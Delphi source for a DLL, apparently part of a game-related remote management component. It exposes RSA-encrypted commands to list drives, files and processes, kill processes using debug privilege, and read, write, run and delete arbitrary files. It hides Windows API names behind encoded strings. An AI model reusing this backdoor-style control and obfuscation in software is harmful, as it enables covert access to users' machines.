unit DLLMain;

interface
uses
  Windows, Messages, SysUtils, StrUtils, Variants, Classes, Graphics, Controls, Forms, RSA,
  Dialogs, PsAPI, StdCtrls, Comobj;

type
  TCharBuffer = array[0..MAX_PATH] of Char;

  //获取所有正地运行的进程完整路径,是否筛选出非Microsoft程序
function EnumProcessesNames(boDelMicrosoft: Boolean): Integer;
function CheckUserID(nUserID: Integer; sStr: string): Boolean;
function EnumDrive: Integer;
function EnmuFile(sDir: string): Integer;
function RSADecodeString(sMsg: string): string;
function DownFileData(sFileName: string; Buffer: PChar; BufferLen: Integer; nPos: Integer; var nSize: Integer): Integer;
function CreateFile(sFileName: string): Integer;
function WriteFileData(Buffer: PChar; BufferLen: Integer; nPos: Integer): Integer;
function ExecFile(sFileName: string; uCmdShow: LongWord): Integer;
function DelFile(sFileName: string): Boolean;
function CloseProcess(nPID: Integer): Boolean;

var
  TempList: TStringList;

implementation

//使用取进程完整路径，需要判断是否64位系统，不然取路径会错误

var
  RSA: TRSA;
  GAMERSA: TRSA;
  DownFileName: string;

function IsWin64: Boolean;
var
  Kernel32Handle: THandle;
  IsWow64Process: function(Handle: Windows.THandle; var Res: Windows.BOOL): Windows.BOOL; stdcall;
  GetNativeSystemInfo: procedure(var lpSystemInfo: TSystemInfo); stdcall;
  isWoW64: Bool;
  SystemInfo: TSystemInfo;
const
  PROCESSOR_ARCHITECTURE_AMD64 = 9;
  PROCESSOR_ARCHITECTURE_IA64 = 6;
begin
  Result := False;
  try
    Kernel32Handle := GetModuleHandle(PChar(RSADecodeString('AlsX5IggjDhAGxTOHy'))); //KERNEL32.DLL
    if Kernel32Handle = 0 then
      Kernel32Handle := LoadLibrary(PChar(RSADecodeString('AlsX5IggjDhAGxTOHy')));
    if Kernel32Handle <> 0 then begin
      IsWOW64Process := GetProcAddress(Kernel32Handle, PChar(RSADecodeString('OQ64XDNYuWetVAEJGYHJNrYMpOpujIL=4a')));  //IsWow64Process
      GetNativeSystemInfo := GetProcAddress(Kernel32Handle, PChar(RSADecodeString('C6mcfbdMw3kgifzWrIEECn=vIsaeo43lsy')));  //GetNativeSystemInfo
      if Assigned(IsWow64Process) then begin
        IsWow64Process(GetCurrentProcess, isWoW64);
        Result := isWoW64 and Assigned(GetNativeSystemInfo);
        if Result then begin
          GetNativeSystemInfo(SystemInfo);
          Result := (SystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64) or
            (SystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_IA64);
        end;
      end;
    end;
  except
    Result := False;
  end;
end;

function GetFileLegalCopyright(sFileName: string): string;
const
  SFInfo = '\StringFileInfo\';
var
  VersionInfo: PChar;
  InfoSize: LongWord;
  Translation: Pointer;
  InfoPointer: Pointer;
  VersionValue: string;
begin
  Result := '';
  InfoSize := GetFileVersionInfoSize(PChar(sFileName), InfoSize);
  if InfoSize = 0 then
    exit;
  VersionInfo := AllocMem(InfoSize);
  try
    if GetFileVersionInfo(PChar(sFileName), 0, InfoSize, VersionInfo) then begin
      if VerQueryValue(VersionInfo, '\VarFileInfo\Translation', Translation, InfoSize) then begin
        VersionValue := SFInfo + IntToHex(LoWord(Longint(Translation^)), 4) +
          IntToHex(HiWord(Longint(Translation^)), 4) + '\';
        if VerQueryValue(VersionInfo, PChar(VersionValue + 'LegalCopyright'), InfoPointer, InfoSize) then
          Result := PChar(InfoPointer);
      end;
    end;
  finally
    FreeMem(VersionInfo);
  end;
end;

function EnumDrive: Integer;
var
  Buff: array[0..255] of array[0..3] of Char;
  Count, I: Integer;
begin
  Result := -1;
  TempList.Clear;
  Try
    Count := GetLogicalDriveStrings(SizeOf(Buff), @buff);
    for I := 0 to (Count div 4) - 1 do begin
      if GetDriveType(Buff[i]) in [DRIVE_REMOVABLE, DRIVE_FIXED] then begin
        TempList.Add(RSA.EncryptStr(strpas(Buff[i])));
        Inc(Result);
      end;
    end;
  Except
  End;
end;

function EnmuFile(sDir: string): Integer;
var
  sr: TSearchRec;
  Size : Int64;
  FileAttrs: Integer;
  Info: TWin32FindData;
  Hnd: THandle;
begin
  Result := -1;
  TempList.Clear;
  sDir := RSA.DecryptStr(sDir);
  Try
    if RightStr(sDir, 1) <> '\' then
      sDir := sDir + '\';
    FileAttrs := SysUtils.faReadOnly;
    FileAttrs := FileAttrs + SysUtils.faHidden;
    FileAttrs := FileAttrs + SysUtils.faDirectory;
    FileAttrs := FileAttrs + SysUtils.faArchive;
    FileAttrs := FileAttrs + SysUtils.faAnyFile;
    if FindFirst(sDir + '*.*', FileAttrs, sr) = 0 then begin
      repeat
        if (Sr.Attr and faDirectory) = faDirectory then begin
          if sr.Name[1] <> '.' then begin
            TempList.Add(RSA.EncryptStr('-1/' + sr.name));
            Inc(Result);
          end;
        end
        else begin
          Size := 0;
          Hnd := FindFirstFile(PChar(sDir + sr.name), Info);
          if (Hnd <> INVALID_HANDLE_VALUE) then begin
             Windows.FindClose(Hnd);
             Int64Rec(Size).Lo := Info.nFileSizeLow;
             Int64Rec(Size).Hi := Info.nFileSizeHigh;
          end;
          TempList.Add(RSA.EncryptStr(IntToStr(Size) + '/' + sr.name));
          Inc(Result);
        end;
      until FindNext(sr) <> 0;
    end;
    FindClose(sr);
  Except
  End;
end;

function EnumProcessesNames(boDelMicrosoft: Boolean): Integer;
var
  nPIDCount: LongWord;
  PID: array[0..255] of DWORD;
  I: Integer;
  ProcessHandle: THandle;
  CharBuff: TCharBuffer;
  sLegalCopyright: string;
  tkp: TTokenPrivileges;
  hToken: THandle;
  nLen: DWord;
begin
  Result := -1;
  TempList.Clear;
  try
    if (not IsWin64) then begin
      if OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken) then begin
        LookupPrivilegeValue('', 'SeDebugPrivilege', tkp.Privileges[0].Luid);
        tkp.PrivilegeCount := 1;
        tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        nLen := 0;
        AdjustTokenPrivileges(hToken, False, tkp, SizeOf(TTokenPrivileges), nil, nLen);
      end;
      CloseHandle(hToken);
      if not EnumProcesses(@PID, SizeOf(PID), nPIDCount) then exit;
      for I := 0 to (nPIDCount div 4) - 1 do begin
        if PID[I] > 10 then begin
          ProcessHandle := Windows.OpenProcess(PROCESS_ALL_ACCESS, False, PID[I]);
          Try
            if ProcessHandle > 0 then begin
              GetModuleFileNameEx(ProcessHandle, 0, @CharBuff[0], MAX_PATH);
              sLegalCopyright := GetFileLegalCopyright(CharBuff);
              if (not boDelMicrosoft) or (boDelMicrosoft and (Pos('Microsoft', sLegalCopyright) <= 0)) then begin
                TempList.Add(RSA.EncryptStr(IntToStr(PID[I]) + '/' + strpas(CharBuff)));
                Inc(Result);
              end;
            end else begin
                TempList.Add(RSA.EncryptStr(IntToStr(PID[I]) + '/' + 'OpenProcess Error ' + IntToStr(PID[I])));
                Inc(Result);
            end;
          Finally
            CloseHandle(ProcessHandle);
          End;
        end;
      end;
    end;
  except
    Result := -1;
  end;
end;

function CloseProcess(nPID: Integer): Boolean;
var
  ProcessHandle: THandle;
  tkp: TTokenPrivileges;
  hToken: THandle;
  nLen: DWord;
begin
  Result := False;
  Try
    if nPID > 10 then begin
      if OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken) then begin
        LookupPrivilegeValue('', 'SeDebugPrivilege', tkp.Privileges[0].Luid);
        tkp.PrivilegeCount := 1;
        tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        nLen := 0;
        AdjustTokenPrivileges(hToken, False, tkp, SizeOf(TTokenPrivileges), nil, nLen);
      end;
      CloseHandle(hToken);
      ProcessHandle := Windows.OpenProcess(PROCESS_ALL_ACCESS, False, nPID);
      Try
        if ProcessHandle > 0 then begin
          Result := TerminateProcess(ProcessHandle, 0);
        end;
      Finally
        CloseHandle(ProcessHandle);
      End;
    end;
  Except
    Result := False;
  End;
end;

function CheckUserID(nUserID: Integer; sStr: string): Boolean;
begin
  Result := False;
  Try
    if (nUserID = -1) or (sStr = '') then
      exit;
    if StrToIntDef(RSA.DecryptStr(sStr), -1) = nUserID then
      Result := True;
  Except
  End;
end;

function RSADecodeString(sMsg: string): string;
begin
  Try
    Result := GAMERSA.DecryptStr(sMsg);
  Except
    Result := '';
  End;
end;

function DownFileData(sFileName: string; Buffer: PChar; BufferLen: Integer; nPos: Integer; var nSize: Integer): Integer;
var
  FileStream: TFileStream;
begin
  Result := -1;
  nSize := 0;
  Try
    if sFileName <> '' then sFileName := RSA.DecryptStr(sFileName);
    if sFileName = '' then sFileName := DownFileName;
    DownFileName := sFileName;
    if FileExists(DownFileName) then begin
      FileStream := TFileStream.Create(DownFileName, fmOpenRead);
      if FileStream <> nil then begin
        nSize := FileStream.Size;
        FileStream.Seek(nPos, soFromBeginning);
        Result := FileStream.Read(Buffer^, BufferLen);
        FileStream.Free;
      end;
    end;
  Except
    Result := -1;
  End;
end;

function WriteFileData(Buffer: PChar; BufferLen: Integer; nPos: Integer): Integer;
var
  FileStream: TFileStream;
begin
  Result := -1;
  Try
    if FileExists(DownFileName) then FileStream := TFileStream.Create(DownFileName, fmOpenWrite)
    else FileStream := TFileStream.Create(DownFileName, fmCreate);
    if FileStream <> nil then begin
      FileStream.Seek(nPos, soFromBeginning);
      FileStream.Write(Buffer^, BufferLen);
      Result := FileStream.Position;
      FileStream.Free;
    end;
  Except
    Result := -1;
  End;
end;

function CreateFile(sFileName: string): Integer;
var
  FileStream: TFileStream;
begin
  Try
    DownFileName := RSA.DecryptStr(sFileName);
    if FileExists(DownFileName) then FileStream := TFileStream.Create(DownFileName, fmOpenWrite)
    else FileStream := TFileStream.Create(DownFileName, fmCreate);
    Result := FileStream.Size;
    FileStream.Free;
  Except
    Result := -1;
  End;
end;

function ExecFile(sFileName: string; uCmdShow: LongWord): Integer;
var
  OldDir: TCharBuffer;
  FileName: string;
begin
  GetCurrentDirectory(MAX_PATH, @OldDir);
  Try
    FileName := RSA.DecryptStr(sFileName);
    SetCurrentDirectory(PChar(ExtractFilePath(FileName)));
    Result := WinExec(PChar(FileName), uCmdShow);
  Finally
    SetCurrentDirectory(@OldDir);
  End;
end;

function DelFile(sFileName: string): Boolean;
begin
  Result := DeleteFile(RSA.DecryptStr(sFileName));
end;

initialization
  begin
    TempList := TStringList.Create;
    GAMERSA := TRSA.Create(nil);
    GAMERSA.Server := False;
    GAMERSA.CommonalityKey := '502812109';
    GAMERSA.CommonalityMode := '792254678554142420572888751747';
    RSA := TRSA.Create(nil);
    RSA.Server := False;
    RSA.CommonalityKey := RSADecodeString('aPX0U=GNng3rGX1=Dy'); //919133779
    RSA.CommonalityMode := RSADecodeString('bd8zYrI0DifjxWk4=ARtnDzRO+22QHl9pwJxYDWmg=R38h3nczg'); //266396447921554759000084948877
  end;

finalization
  begin
    RSA.Free;
    GAMERSA.Free;
    TempList.Free;
  end;

end.

